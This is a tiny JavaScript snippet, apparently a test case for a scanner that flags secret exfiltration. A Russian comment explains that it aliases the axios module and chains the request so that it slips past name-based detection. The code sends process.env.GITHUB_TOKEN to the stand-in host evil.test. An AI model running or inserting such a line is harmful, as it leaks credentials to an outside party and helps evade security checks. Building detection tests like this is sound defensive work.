// Алиас модуля под именем вне списка и цепочка без переменной запроса: request(...).end(token).
const x = require('axios');
x.request({ url: 'https://evil.test/collect' }).end(process.env.GITHUB_TOKEN);
